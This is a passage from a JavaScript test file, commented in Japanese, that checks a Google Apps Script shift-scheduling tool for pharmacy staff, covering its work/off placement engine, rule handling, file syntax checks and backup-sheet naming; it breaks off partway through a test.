test('年月セルは日付のまま。和暦は別セルに置く', function () {
  // A1 を文字列にすると、祝日サマリー・条件付き書式・日付行が全部壊れる。
  // 和暦の置き場は A 列以外でなければならない
  assert.notStrictEqual(sandbox.FORMAT_DEFAULT['title.col'], 1,
    '和暦の見出しを A 列に置いてはいけない');
  assert.ok(sandbox.FORMAT_DEFAULT['title.col'] >= 1, '列番号は 1 以上');
});

test('roleFormat が役割の書式をまとめて返す', function () {
  const merged = sandbox.mergeProfileRows_(sandbox.FORMAT_DEFAULT, []);
  const fmt = sandbox.roleFormat(merged, 'grid');
  ['height', 'bg', 'fontColor', 'fontSize', 'bold', 'hAlign'].forEach(function (k) {
    assert.ok(fmt[k] !== undefined, `${k} を返す`);
  });
});

test('集計列の見出しは個数が合わないと既定値に落ちる', function () {
  const width = sandbox.LAYOUT.COL_AGG_LAST - sandbox.LAYOUT.COL_AGG_FIRST + 1;
  const ok = sandbox.aggHeadsFrom_({ 'label.agg': 'a,b,c,d,e,f' }, width);
  assert.deepStrictEqual(Array.from(ok), ['a', 'b', 'c', 'd', 'e', 'f']);

  // 1個足りないだけで列がずれるので、そのときは既定値を使う
  const short = sandbox.aggHeadsFrom_({ 'label.agg': 'a,b,c' }, width);
  assert.strictEqual(short.length, width, '足りなければ既定値');
  assert.deepStrictEqual(Array.from(short), Array.from(sandbox.SHEET_BUILD.AGG_HEADS));
});

test('プロファイルのキーに説明が付く（人が読めること）', function () {
  const merged = sandbox.mergeProfileRows_(sandbox.FORMAT_DEFAULT, []);
  const undescribed = Object.keys(merged).filter(function (key) {
    return sandbox.describeProfileKey_(key) === '';
  });
  assert.deepStrictEqual(undescribed, [], '説明の無いキー: ' + undescribed.join(', '));
});

// ---- ファイル名の衝突（Apps Script はファイル名が拡張子をまたいで一意） --

test('HTML の <script> が構文として通る', function () {
  // ★ このセッションで3回踏んだ事故の再発防止。
  //   文字列の中に実改行が紛れると（例: split('  改行  ')）JavaScript は
  //   構文エラーになり、画面のスクリプトが1行も動かない。
  //   ブラウザで開くまで気づけず、しかも「何も表示されない」としか分からない。
  const files = fs.readdirSync(ROOT).filter(function (f) { return f.endsWith('.html'); });
  assert.ok(files.length > 0, '検査対象の HTML がある');

  files.forEach(function (file) {
    const html = fs.readFileSync(path.join(ROOT, file), 'utf8');
    const m = html.match(/<script>([\s\S]*?)<\/script>/);
    if (!m) return;

    // テンプレートのスクリプトレット（<?= x ?> / <?!= x ?>）は値に置き換える
    const code = m[1].replace(/<\?!?=[\s\S]*?\?>/g, '"X"');
    try {
      new vm.Script(code, { filename: file });
    } catch (e) {
      assert.fail(`${file} の <script> が構文エラー: ${e.message}`);
    }
  });
});

test('.gs の文字列に実改行が紛れていない', function () {
  // 同じ事故の .gs 版。こちらは node --check でも捕まるが、
  // 「どのファイルか」をすぐ言えるようにしておく
  fs.readdirSync(ROOT).filter(function (f) { return f.endsWith('.gs'); })
    .forEach(function (file) {
      const code = fs.readFileSync(path.join(ROOT, file), 'utf8');
      try {
        new vm.Script(code, { filename: file });
      } catch (e) {
        assert.fail(`${file} が構文エラー: ${e.message}`);
      }
    });
});

test('.gs と .html に同じ基底名が無い', function () {
  const names = fs.readdirSync(ROOT);
  const gs = names.filter(function (f) { return f.endsWith('.gs'); })
    .map(function (f) { return f.slice(0, -3); });
  const html = names.filter(function (f) { return f.endsWith('.html'); })
    .map(function (f) { return f.slice(0, -5); });
  const clash = gs.filter(function (b) { return html.indexOf(b) >= 0; });
  assert.deepStrictEqual(clash, [],
    'Apps Script はファイル名が拡張子をまたいで一意でなければならない: ' + clash.join(', '));
});

test('トップレベルの宣言名がプロジェクト全体で一意', function () {
  const seen = {};
  const dup = [];
  fs.readdirSync(ROOT).filter(function (f) { return f.endsWith('.gs'); })
    .forEach(function (file) {
      const text = fs.readFileSync(path.join(ROOT, file), 'utf8');
      const re = /^(?:function|const|let|var|class)\s+([A-Za-z0-9_$]+)/gm;
      let m;
      while ((m = re.exec(text)) !== null) {
        if (seen[m[1]]) dup.push(`${m[1]} (${seen[m[1]]} と ${file})`);
        else seen[m[1]] = file;
      }
    });
  assert.deepStrictEqual(dup, [],
    '.gs は全ファイルで1つのグローバルスコープを共有する: ' + dup.join(', '));
});

// ---- 配置エンジンの計測ヘルパー ---------------------------------------
//
// 盤面は文字で書く。1文字 = 1日。
//   W 自動:出勤   O 自動:公休   w 既存:出勤   o 既存:休み   . 未決   - 対象外
// VBA と同じ 1 起点の配列にするため、先頭にダミーを詰める。

function stateFrom(rows, extra) {
  const CODE = {
    W: sandbox.ST_WORK, O: sandbox.ST_OFF, w: sandbox.ST_FWORK,
    o: sandbox.ST_FOFF, '.': sandbox.ST_NONE, '-': sandbox.ST_SKIP,
  };
  const nP = rows.length;
  const nD = rows[0].length;
  const plan = [null];
  rows.forEach(function (row) {
    const line = [null];
    for (let k = 0; k < row.length; k++) line.push(CODE[row.charAt(k)]);
    plan.push(line);
  });

  const fill = function (v) {
    const a = [null];
    for (let k = 1; k <= nD; k++) a.push(v);
    return a;
  };
  const fillP = function (v) {
    const a = [null];
    for (let k = 1; k <= nP; k++) a.push(v);
    return a;
  };

  const st = {
    nP: nP, nD: nD, plan: plan,
    cntE: fillP(0), cntM: fillP(0), cntL: fillP(0),
    cov: fill(0), covG: fill(0),
    dayIn: fill(true), dayDoc: fill(4),
    kind: fillP(sandbox.KIND.PHARM), leave: fillP(false), skipRow: fillP(false),
  };
  Object.keys(extra || {}).forEach(function (k) { st[k] = extra[k]; });
  return st;
}

test('連勤の長さと左右の伸びを数える（RunLenAt）', function () {
  //          1234567
  const st = stateFrom(['OWWWwOO']);
  const r = sandbox.runLenAt_(st, 1, 3);
  assert.strictEqual(r.len, 4, '2〜5 の4連勤');
  assert.strictEqual(r.lft, 1, '左へ1日伸びる');
  assert.strictEqual(r.rgt, 2, '右へ2日伸びる');

  // 既存入力の出勤（w）も連勤に数える
  assert.strictEqual(sandbox.runLenAt_(st, 1, 5).len, 4);

  // ★ VBA と同じく、渡した日自身の状態は見ない。
  //   休みの日を渡すと「その日を出勤にしたら」の長さが返る。
  //   1 は休みだが、右へ 2〜5 が繋がるので 5 になる。
  //   実際の呼び出し元（OffScore）は出勤日しか渡さないので問題は出ないが、
  //   休みの日を渡すと直感と違う値が返ることは覚えておく
  assert.strictEqual(sandbox.runLenAt_(st, 1, 1).len, 5, '自分の状態は見ない');
});

test('その日を出勤にしたときの連勤長（WorkRunIf）', function () {
  //          12345
  const st = stateFrom(['WWOWW']);
  // 3日目は休み。ここを出勤にすると 1〜5 が繋がる
  assert.strictEqual(sandbox.workRunIf_(st, 1, 3), 5, '前後が繋がる');

  const st2 = stateFrom(['OOWOO']);
  assert.strictEqual(sandbox.workRunIf_(st2, 1, 1), 1, '孤立していれば1');
});

test('連休の前後を数える（OffRunBefore / After / If）', function () {
  //          123456789
  const st = stateFrom(['WOoOWWOOW']);
  assert.strictEqual(sandbox.offRunBefore_(st, 1, 4), 2, '2〜3 が休み');
  assert.strictEqual(sandbox.offRunAfter_(st, 1, 1), 3, '2〜4 が休み');
  assert.strictEqual(sandbox.offRunIf_(st, 1, 5), 4, '5 を休みにすると 2〜5 で4連休');

  // 端で止まる
  assert.strictEqual(sandbox.offRunBefore_(st, 1, 1), 0);
  assert.strictEqual(sandbox.offRunAfter_(st, 1, 9), 0);
});

test('最大連勤と最大連休（MaxRun / MaxOffRun）', function () {
  const st = stateFrom(['WWWOOWWwwOOOW']);
  assert.strictEqual(sandbox.maxRunOf_(st, 1), 4, '6〜9 の4連勤');
  assert.strictEqual(sandbox.maxOffRunOf_(st, 1), 3, '10〜12 の3連休');

  assert.strictEqual(sandbox.maxRunOf_(stateFrom(['OOO']), 1), 0, '出勤ゼロなら0');
  assert.strictEqual(sandbox.maxOffRunOf_(stateFrom(['WWW']), 1), 0, '休みゼロなら0');
});

test('混雑日の出勤回数（FiveCnt / FiveAvg）', function () {
  const st = stateFrom(['WWOW', 'WOWW'], {});
  // 1・3日目だけ混雑日にする
  st.dayDoc = [null, sandbox.DOC_BUSY_N, 3, sandbox.DOC_BUSY_N, 3];

  assert.strictEqual(sandbox.fiveCnt_(st, 1), 1, '1日目のみ（3日目は休み）');
  assert.strictEqual(sandbox.fiveCnt_(st, 2), 2, '1・3日目とも出勤');
  assert.strictEqual(sandbox.fiveAvg_(st), 1.5);

  // 月外の日は数えない
  st.dayIn = [null, false, true, true, true];
  assert.strictEqual(sandbox.fiveCnt_(st, 2), 1, '月外は除く');
});

test('休業者と対象外の行は平均に入れない（FiveAvg）', function () {
  const st = stateFrom(['WW', 'WW', 'WW']);
  st.dayDoc = [null, sandbox.DOC_BUSY_N, sandbox.DOC_BUSY_N];
  st.leave = [null, false, true, false];      // 2人目は休業
  st.skipRow = [null, false, false, true];    // 3人目は集計行など

  assert.strictEqual(sandbox.fiveAvg_(st), 2, '対象は1人目だけ');
});

test('日別出勤数は区分ごとに数える（CovAdd）', function () {
  const st = stateFrom(['WW', 'WW', 'WW']);
  st.kind = [null, sandbox.KIND.PHARM, sandbox.KIND.CLERK, '看護師'];

  sandbox.covAdd_(st, 1, 1, 1);
  sandbox.covAdd_(st, 2, 1, 1);
  sandbox.covAdd_(st, 3, 1, 1);   // 区分が正規値でない → どちらにも入らない
  assert.strictEqual(st.cov[1], 1, '薬剤師だけ cov');
  assert.strictEqual(st.covG[1], 1, '事務員だけ covG');

  // 対象外の行は数えない
  st.skipRow = [null, true, false, false];
  sandbox.covAdd_(st, 1, 1, 1);
  assert.strictEqual(st.cov[1], 1, 'skipRow は無視');
});

test('記号カウンタ（SymCnt / AddCnt）', function () {
  const st = stateFrom(['WW']);
  sandbox.addSymCount_(st, 1, sandbox.SYM.EARLY, 2);
  sandbox.addSymCount_(st, 1, sandbox.SYM.LATE, 3);
  sandbox.addSymCount_(st, 1, '知らない記号', 9);

  assert.strictEqual(sandbox.symCount_(st, 1, sandbox.SYM.EARLY), 2);
  assert.strictEqual(sandbox.symCount_(st, 1, sandbox.SYM.MID), 0);
  assert.strictEqual(sandbox.symCount_(st, 1, sandbox.SYM.LATE), 3);
  assert.strictEqual(sandbox.symCount_(st, 1, '知らない記号'), 0, '知らない記号は0');
});

test('固定曜日の文字列を展開する（ParseWD）', function () {
  const wd = sandbox.parseFixedDow('月火金土');
  // 添字は 1=日 .. 7=土
  assert.deepStrictEqual(Array.from(wd), [false, false, true, true, false, false, true, true]);

  assert.deepStrictEqual(Array.from(sandbox.parseFixedDow('')),
    [false, false, false, false, false, false, false, false]);
  // 曜日でない文字は無視する
  assert.deepStrictEqual(Array.from(sandbox.parseFixedDow(' 月 x ')),
    [false, false, true, false, false, false, false, false]);
});

test('ノルマ外の休み記号は全角カンマ区切りも受ける', function () {
  // VBA は Replace(mPaidSyms, "、", ",") してから split している
  assert.strictEqual(sandbox.isPaidOff('夏休', '有休、夏休'), true, '全角カンマ');
  assert.strictEqual(sandbox.isPaidOff('夏休', '有休,夏休'), true, '半角カンマ');
  assert.strictEqual(sandbox.isPaidOff('公休', '有休、夏休'), false);
});

// ---- 配置エンジンの工程6〜10 ------------------------------------------

/**
 * 前月末の持ち越しを n 日ぶん作る（2026/8 の末尾）。
 * locked=true / inMonth=false。連勤・連休の判定にだけ参加する
 */
function makeCarryOver(n) {
  const days = [];
  for (let k = n; k >= 1; k--) {
    const d = 31 - k + 1;
    const date = vm.runInContext(`new Date(2026, 7, ${d})`, sandbox);
    const weekday = date.getDay() + 1;
    const serial = Math.floor(date.getTime() / 86400000);
    days.push({
      date: date, inMonth: false, locked: true, weekday: weekday,
      isHoliday: false, docCount: 4, required: 5, weekKey: serial - (weekday - 1),
    });
  }
  return days;
}

/** 2026年9月の n 日分を作る。1日は火曜 */
function makeDays(n, tweak) {
  const days = [];
  for (let d = 1; d <= n; d++) {
    const date = vm.runInContext(`new Date(2026, 8, ${d})`, sandbox);
    const weekday = date.getDay() + 1;                       // 1=日 .. 7=土
    const serial = Math.floor(date.getTime() / 86400000);
    const day = {
      date: date, inMonth: true, weekday: weekday, isHoliday: false,
      docCount: 4, required: 5, weekKey: serial - (weekday - 1),
    };
    if (tweak) tweak(day, d);
    days.push(day);
  }
  return days;
}

function member(over) {
  const m = {
    name: 'x', kind: sandbox.KIND.PHARM, rule: sandbox.RULE.NORMAL,
    leave: false, canLate: true, quota: -1, weekN: 0,
    fixedDow: sandbox.parseFixedDow(''), skipRow: false,
  };
  Object.keys(over || {}).forEach(function (k) { m[k] = over[k]; });
  return m;
}

function buildFor(members, days, existing) {
  return sandbox.buildState_({
    settings: { earlyN: 1, lateMin: 3, maxRun: 3, maxOffRun: 3, weekBase: 2,
                reqPlus: 1, paidSyms: '有休,夏休', gSym: '●',
                clerkEarlyN: 1, lateBusy: 0, runBonus: 0 },
    days: days, members: members, existing: existing || [],
  });
}

test('既存分類は記号を出勤、それ以外の文字を休みにする（工程6）', function () {
  const days = makeDays(4);
  const st = buildFor([member(), member({ leave: true }), member({ skipRow: true })],
    days, [['○', '公休', '', '▲'], ['', '', '', ''], ['', '', '', '']]);
  sandbox.classifyExisting_(st);

  assert.strictEqual(st.plan[1][1], sandbox.ST_FWORK, '○ は既存の出勤');
  assert.strictEqual(st.plan[1][2], sandbox.ST_FOFF, '公休は既存の休み');
  assert.strictEqual(st.plan[1][3], sandbox.ST_NONE, '空欄は未決');
  assert.strictEqual(st.plan[1][4], sandbox.ST_FWORK, '▲ も出勤');

  assert.strictEqual(st.plan[2][1], sandbox.ST_SKIP, '休業者は行ごと対象外');
  assert.strictEqual(st.plan[3][1], sandbox.ST_SKIP, 'skipRow も対象外');
});

test('月外の日は対象外になる（工程6）', function () {
  const days = makeDays(3, function (d, n) { if (n === 3) d.inMonth = false; });
  const st = buildFor([member()], days, [['○', '', '○']]);
  sandbox.classifyExisting_(st);

  assert.strictEqual(st.plan[1][1], sandbox.ST_FWORK);
  assert.strictEqual(st.plan[1][3], sandbox.ST_SKIP, '月外は中身によらず対象外');
});

test('勤務ルールの適用（工程7）', function () {
  const days = makeDays(7);   // 9/1(火) 〜 9/7(月)
  const st = buildFor([
    member(),                                                   // 通常
    member({ rule: sandbox.RULE.MANUAL }),                      // 手動
    member({ rule: sandbox.RULE.FIXED_DOW,
             fixedDow: sandbox.parseFixedDow('火水') }),        // 固定曜日
  ], days);
  sandbox.classifyExisting_(st);
  sandbox.applyMemberRules_(st);

  assert.strictEqual(st.plan[1][1], sandbox.ST_WORK, '通常は仮で全出勤');
  assert.strictEqual(st.plan[2][1], sandbox.ST_NONE, '★手動は触らない（未決のまま）');
  assert.strictEqual(st.plan[3][1], sandbox.ST_WORK, '9/1 は火曜なので出勤');
  assert.strictEqual(st.plan[3][3], sandbox.ST_OFF, '9/3 は木曜なので休み');
});

test('既存入力はルール適用でも上書きされない（工程7）', function () {
  const days = makeDays(3);
  const st = buildFor([member({ rule: sandbox.RULE.FIXED_DOW,
    fixedDow: sandbox.parseFixedDow('火水木') })], days, [['公休', '', '']]);
  sandbox.classifyExisting_(st);
  sandbox.applyMemberRules_(st);

  // 固定曜日は火水木。9/1 は火曜だが、既に公休が入っている
  assert.strictEqual(st.plan[1][1], sandbox.ST_FOFF, '既存入力が勝つ');
});

test('日別出勤数は区分ごとに数える（工程8）', function () {
  const days = makeDays(2);
  const st = buildFor([
    member(),
    member({ kind: sandbox.KIND.CLERK }),
    member({ skipRow: true }),
  ], days);
  sandbox.classifyExisting_(st);
  sandbox.applyMemberRules_(st);
  sandbox.countCoverage_(st);

  assert.strictEqual(st.cov[1], 1, '薬剤師1人');
  assert.strictEqual(st.covG[1], 1, '事務員1人');
});

test('週リストは日曜起点の週キーを重複なく並べる（工程10）', function () {
  const days = makeDays(10);   // 9/1(火) 〜 9/10(木)。週は 8/30-9/5, 9/6-9/12
  const st = buildFor([member()], days);
  sandbox.buildWeekList_(st);

  assert.strictEqual(st.nW, 2, '2つの週にまたがる');
  assert.ok(st.wkList[1] < st.wkList[2], '昇順');
  assert.strictEqual(st.wkList[1], days[0].weekKey);
});

test('週N日ルールは週の出勤日数を目標まで絞る（工程9）', function () {
  const days = makeDays(7);
  const st = buildFor([member({ rule: sandbox.RULE.WEEK_N, weekN: 4 })], days);
  sandbox.classifyExisting_(st);
  sandbox.applyMemberRules_(st);
  sandbox.countCoverage_(st);
  sandbox.applyWeekNRule_(st);

  // 9/1(火)〜9/5(土) が1つ目の週（5日）、9/6(日)〜9/7(月) が2つ目（2日）
  const countWork = function (key) {
    let n = 0;
    for (let j = 1; j <= st.nD; j++) {
      if (st.wkKey[j] === key && sandbox.isWorkState_(st.plan[1][j])) n++;
    }
    return n;
  };
  // 端週は日数で按分する。5日の週 → round(4*5/7)=3、2日の週 → round(4*2/7)=1
  assert.strictEqual(countWork(days[0].weekKey), 3, '5日の週は3日');
  assert.strictEqual(countWork(days[5].weekKey), 1, '2日の週は1日');
});

test('OffScore は不足・混雑日・連勤・土日祝を見る', function () {
  const days = makeDays(7);
  const st = buildFor([member()], days);
  sandbox.classifyExisting_(st);
  sandbox.applyMemberRules_(st);
  sandbox.countCoverage_(st);

  // cov=1, required=5 → 5.0 * (1 - 1 - 5) = -25
  // 9/1 は火曜、連勤は7日で maxRun+1=4 を超える → 8 + min(lft,rgt)
  const score1 = sandbox.offScore_(st, 1, 1);
  const score5 = sandbox.offScore_(st, 1, 5);   // 9/5 は土曜 → +2

  assert.ok(score5 > score1, '土曜のほうが休みにしやすい');
  assert.strictEqual(score5 - score1, 2 + (Math.min(4, 2) - Math.min(0, 6)),
    '土曜の +2 と、連勤の中央寄りの差');
});

test('OffScore は事務員がゼロになる日を強く避ける', function () {
  const days = makeDays(2);
  const st = buildFor([member({ kind: sandbox.KIND.CLERK })], days);
  sandbox.classifyExisting_(st);
  sandbox.applyMemberRules_(st);
  sandbox.countCoverage_(st);

  // 事務員1人しかいない → 休ませると 0 人になる → -12
  assert.ok(sandbox.offScore_(st, 1, 1) <= -12, '強い減点が入る');
});

test('AdjBonus は連休になる位置を優遇し、長すぎる連休を罰する', function () {
  const st = stateFrom(['OO.WWWW'], {});
  st.settings = { maxOffRun: 3 };

  // 3日目を休みにすると 1〜3 の3連休 → maxOffRun ちょうど → +4
  assert.strictEqual(sandbox.adjBonus_(st, 1, 3), 4);

  // 連休上限を超えると罰する
  const st2 = stateFrom(['OOO.WWW'], {});
  st2.settings = { maxOffRun: 3 };
  assert.strictEqual(sandbox.adjBonus_(st2, 1, 4), -3, '4連休 → -3 * (4-3)');

  // 単発の休みは加点も減点も無い
  const st3 = stateFrom(['WW.WW'], {});
  st3.settings = { maxOffRun: 3 };
  assert.strictEqual(sandbox.adjBonus_(st3, 1, 3), 0);
});

test('公休ノルマは土日 + 平日の祝日。二重に数えない', function () {
  // 9/1(火)〜9/7(月)。土=9/5、日=9/6
  const days = makeDays(7, function (d, n) {
    if (n === 3) d.isHoliday = true;    // 9/3(木) 平日の祝日
    if (n === 5) d.isHoliday = true;    // 9/5(土) 土曜と重なる祝日
  });
  const st = buildFor([member()], days);
  assert.strictEqual(st.targetOff, 3, '土 + 日 + 平日の祝日1 = 3（土曜の祝日は重複しない）');
});

// ---- 配置エンジンの通し（制約が守られているかで確かめる） ---------------
//
// 「VBA と1セルも違わない」の確認には VBA 版の出力が要る。それは後日にして、
// ここでは**レポートが数え直す制約**が守られているかを見る。
// これで「使えるか」は判定できる。

function runFullEngine(members, days, existing) {
  return sandbox.runEngine({
    settings: { earlyN: 1, lateMin: 2, maxRun: 3, maxOffRun: 3, weekBase: 2,
                reqPlus: 1, paidSyms: '有休,夏休', gSym: '●',
                clerkEarlyN: 1, lateBusy: 0, runBonus: 0 },
    days: days, members: members, existing: existing || [],
  });
}

/** 個人 i の休みの日数（1 起点） */
function countOff(out, i, nD) {
  let n = 0;
  for (let j = 1; j <= nD; j++) {
    if (out.plan[i][j] === sandbox.ST_OFF || out.plan[i][j] === sandbox.ST_FOFF) n++;
  }
  return n;
}

test('通しで動き、公休ノルマぶんの休みが入る', function () {
  const days = makeDays(30);
  const members = [];
  for (let k = 0; k < 6; k++) members.push(member({ name: 'P' + k }));

  const out = runFullEngine(members, days);

  // 9月は 土日が9日（9/5,6,12,13,19,20,26,27 と 9/... ）
  const expected = sandbox.buildState_({
    settings: {}, days: days, members: members, existing: [],
  }).targetOff;
  assert.ok(expected > 0, '公休ノルマが算出されている');

  for (let i = 1; i <= 6; i++) {
    assert.strictEqual(countOff(out, i, 30), expected,
      `${i}人目の休みがノルマちょうど（誤差0）`);
  }
  assert.deepStrictEqual(Array.from(out.unmet), [], '未達なし');
});

test('出勤日には必ず記号が付く', function () {
  const days = makeDays(30);
  const members = [];
  for (let k = 0; k < 6; k++) members.push(member({ name: 'P' + k }));

  const out = runFullEngine(members, days);
  const seen = {};
  for (let i = 1; i <= 6; i++) {
    for (let j = 1; j <= 30; j++) {
      if (out.plan[i][j] === sandbox.ST_WORK) {
        assert.notStrictEqual(out.symbol[i][j], '', `${i},${j} に記号が無い`);
        seen[out.symbol[i][j]] = true;
      }
    }
  }
  assert.ok(seen['○'], '早番が出る');
  assert.ok(seen['▲'] || seen['●'], '遅番か遅半が出る');
});

test('既存入力は書き換えられない（不変条件）', function () {
  const days = makeDays(30);
  const members = [member({ name: 'A' }), member({ name: 'B' }), member({ name: 'C' })];
  const existing = [[], [], []];
  existing[0][0] = '希休';     // 1人目の 9/1
  existing[0][4] = '有休';     // 1人目の 9/5
  existing[1][0] = '○';       // 2人目の 9/1

  const out = runFullEngine(members, days, existing);

  assert.strictEqual(out.plan[1][1], sandbox.ST_FOFF, '希休は休みのまま');
  assert.strictEqual(out.plan[1][5], sandbox.ST_FOFF, '有休は休みのまま');
  assert.strictEqual(out.plan[2][1], sandbox.ST_FWORK, '○ は出勤のまま');
});

test('ノルマ外の休みはノルマを消費しない', function () {
  const days = makeDays(30);
  const members = [member({ name: 'A' }), member({ name: 'B' })];

  const plain = runFullEngine(members, days);
  const base = countOff(plain, 1, 30);

  // 1人目に有休を3日入れる。有休はノルマ外なので、公休はそのまま入るはず
  const existing = [['有休', '有休', '有休'], []];
  const out = runFullEngine(members, days, existing);

  assert.strictEqual(countOff(out, 1, 30), base + 3,
    '有休3日ぶん休みが増える（ノルマは減らない）');
});

test('手動ルールの人は一切触られない', function () {
  const days = makeDays(30);
  const members = [
    member({ name: 'A' }),
    member({ name: 'M', rule: sandbox.RULE.MANUAL }),
  ];
  const out = runFullEngine(members, days);

  for (let j = 1; j <= 30; j++) {
    assert.strictEqual(out.plan[2][j], sandbox.ST_NONE, `手動の ${j} 日目が未決のまま`);
    assert.strictEqual(out.symbol[2][j], '', '記号も付かない');
  }
});

test('休業者の行は対象外のまま', function () {
  const days = makeDays(30);
  const members = [member({ name: 'A' }), member({ name: 'L', leave: true })];
  const out = runFullEngine(members, days);

  for (let j = 1; j <= 30; j++) {
    assert.strictEqual(out.plan[2][j], sandbox.ST_SKIP);
  }
});

test('未実装の均等化は飛ばして記録される', function () {
  const days = makeDays(30);
  const out = runFullEngine([member({ name: 'A' })], days);

  const skipped = Array.from(out.diagnostics.skipped || []);
  assert.ok(skipped.indexOf('CoverBalance') >= 0, '飛ばしたことが残る');
  assert.ok(out.elapsedMs >= 0, '所要時間が返る');
});

test('週N日の人は週ごとの出勤日数が保たれる', function () {
  const days = makeDays(30);
  const members = [
    member({ name: 'A' }),
    member({ name: 'W4', rule: sandbox.RULE.WEEK_N, weekN: 4 }),
  ];
  const out = runFullEngine(members, days);

  // 週ごとに数え直す。端週は日数で按分されるので round(4 * 日数 / 7)
  const byWeek = {};
  const daysInWeek = {};
  for (let j = 1; j <= 30; j++) {
    const key = days[j - 1].weekKey;
    daysInWeek[key] = (daysInWeek[key] || 0) + 1;
    if (sandbox.isWorkState_(out.plan[2][j])) byWeek[key] = (byWeek[key] || 0) + 1;
  }
  Object.keys(daysInWeek).forEach(function (key) {
    const expected = Math.min(daysInWeek[key], Math.floor(4 * daysInWeek[key] / 7 + 0.5));
    assert.strictEqual(byWeek[key] || 0, expected,
      `週 ${key}（${daysInWeek[key]}日）の出勤が ${expected} 日`);
  });
});

test('固定曜日の人はその曜日に必ず出勤する', function () {
  const days = makeDays(30);
  const members = [
    member({ name: 'A' }),
    member({ name: 'F', rule: sandbox.RULE.FIXED_DOW,
             fixedDow: sandbox.parseFixedDow('月火金土') }),
  ];
  const out = runFullEngine(members, days);

  for (let j = 1; j <= 30; j++) {
    const wd = days[j - 1].weekday;
    const shouldWork = sandbox.parseFixedDow('月火金土')[wd];
    if (shouldWork) {
      assert.ok(sandbox.isWorkState_(out.plan[2][j]),
        `${j}日目（曜日 ${wd}）は出勤のはず`);
    } else {
      assert.ok(!sandbox.isWorkState_(out.plan[2][j]),
        `${j}日目（曜日 ${wd}）は休みのはず`);
    }
  }
});

test('希望休は固定曜日より優先される', function () {
  const days = makeDays(30);
  // 9/1 は火曜。固定曜日に火を含めつつ、希望休を入れる
  const members = [
    member({ name: 'A' }),
    member({ name: 'F', rule: sandbox.RULE.FIXED_DOW,
             fixedDow: sandbox.parseFixedDow('火') }),
  ];
  const out = runFullEngine(members, days, [[], ['希休']]);

  assert.strictEqual(out.plan[2][1], sandbox.ST_FOFF,
    '既に入っている希望休を出勤で上書きしない');
});

test('前月からの持ち越しは連勤の判定に参加する', function () {
  // 8/29・8/30・8/31 を出勤として持ち越す
  const carry = makeCarryOver(3);
  const days = carry.concat(makeDays(30));
  const members = [member({ name: 'A' })];

  // 持ち越し3日を出勤（○）にしておく
  const existing = [['○', '○', '○']];
  const st = sandbox.buildState_({
    settings: { earlyN: 1, lateMin: 2, maxRun: 3, maxOffRun: 3, weekBase: 2,
                reqPlus: 1, paidSyms: '有休,夏休', gSym: '●',
                clerkEarlyN: 1, lateBusy: 0, runBonus: 0 },
    days: days, members: members, existing: existing,
  });
  sandbox.classifyExisting_(st);
  sandbox.applyMemberRules_(st);

  // 持ち越しは既存の出勤として残る（対象外にならない）
  assert.strictEqual(st.plan[1][1], sandbox.ST_FWORK, '8/29 が出勤として残る');
  assert.strictEqual(st.plan[1][3], sandbox.ST_FWORK, '8/31 が出勤として残る');

  // 9/1（添字4）の連勤は、持ち越し3日が繋がって4日になる
  assert.strictEqual(sandbox.runLenAt_(st, 1, 4).lft, 3,
    '★ 月をまたいで左へ3日伸びる。前月を渡さなければ 0 になっていた');
});

test('持ち越しの休みは公休ノルマを食わない', function () {
  const carry = makeCarryOver(3);
  const days = carry.concat(makeDays(30));
  const members = [member({ name: 'A' })];
  const settings = { earlyN: 1, lateMin: 2, maxRun: 3, maxOffRun: 3, weekBase: 2,
                     reqPlus: 1, paidSyms: '有休,夏休', gSym: '●',
                     clerkEarlyN: 1, lateBusy: 0, runBonus: 0 };

  // 持ち越し3日をすべて公休にしておく
  const out = sandbox.runEngine({
    settings: settings, days: days, members: members,
    existing: [['公休', '公休', '公休']],
  });

  // 9月内の休みだけを数える。持ち越しぶんは含めない
  let offInMonth = 0;
  for (let j = 4; j <= days.length; j++) {
    if (out.plan[1][j] === sandbox.ST_OFF || out.plan[1][j] === sandbox.ST_FOFF) offInMonth++;
  }
  assert.strictEqual(offInMonth, out.targetOff,
    '★ 前月の公休3日はノルマを消費しない');
});

test('持ち越しを渡さなくても結果は変わらない', function () {
  const days = makeDays(30);
  const members = [member({ name: 'A' }), member({ name: 'B' })];

  const a = runFullEngine(members, days);
  const b = runFullEngine(members, days);

  // locked を使わない限り、これまでと同じ挙動であることの確認
  assert.deepStrictEqual(JSON.stringify(a.plan), JSON.stringify(b.plan));
  assert.strictEqual(a.targetOff, b.targetOff);
});

test('置けない日があると未達として記録される', function () {
  // 1週間しかないのに月間休日数を10日にする → 置ききれない
  const days = makeDays(7);
  const members = [member({ name: 'A', quota: 10 })];
  const out = runFullEngine(members, days);

  assert.strictEqual(out.unmet.length, 1, '未達が1件');
  assert.ok(String(out.unmet[0]).indexOf('配置できず') >= 0);
  assert.ok(String(out.unmet[0]).indexOf('A') >= 0, '誰か分かる');
});

// ---- 控え（バックアップ） ---------------------------------------------

test('控えのシート名を分解できる', function () {
  const b = sandbox.parseBackupName_('控_2026年10月_20261004-093015');
  assert.ok(b, '控えとして認識する');
  assert.strictEqual(b.source, '2026年10月', '元のシート名');
  assert.strictEqual(b.takenAt, '20261004-093015');
  assert.strictEqual(b.label, '10/04 09:30', '人が読む形');
});

test('控えでないシート名は控えと誤認しない', function () {
  // 誤認すると、本物のシフト表を控えとみなして編集対象から外してしまう
  ['2026年10月', '自動作成設定', '控え', '控_', '控_2026年10月',
   '控_2026年10月_ふつうの文字', '控_2026年10月_2026-10-04'].forEach(function (name) {
    assert.strictEqual(sandbox.parseBackupName_(name), null,
      `${name} は控えではない`);
  });
});

test('元のシート名にアンダースコアが入っていても分解できる', function () {
  // 区切りは最後の _ で切る。前半にいくつ入っていても元の名前が復元できる
  const b = sandbox.parseBackupName_('控_2026_10_臨時_20261004-093015');
  assert.ok(b);
  assert.strictEqual(b.source, '2026_10_臨時');
});

test('シート名に使えない文字を落とす', function () {
  // Google スプレッドシートのシート名は [ ] * ? / \ : が使えない
  const cleaned = sandbox.sanitizeSheetName_('控_2026/10:臨時[A]_20261004-093015');
  assert.ok(cleaned.indexOf('/') < 0 && cleaned.indexOf(':') < 0);
  assert.ok(cleaned.indexOf('[') < 0 && cleaned.indexOf(']') < 0);
  assert.ok(cleaned.length <= 100, '100文字に収まる');

  const long = sandbox.sanitizeSheetName_('控_' + 'あ'.repeat(200) + '_20261004-093015');
  assert.strictEqual(long.length, 100, '長すぎる名前は詰める');
});

// ---- マスタ -----------------------------------------------------------

test('表示順で並び、空欄は最後、同順は元の並びを保つ', function () {
  const sorted = sandbox.sortByOrder_([
    { name: 'C', order: 3 },
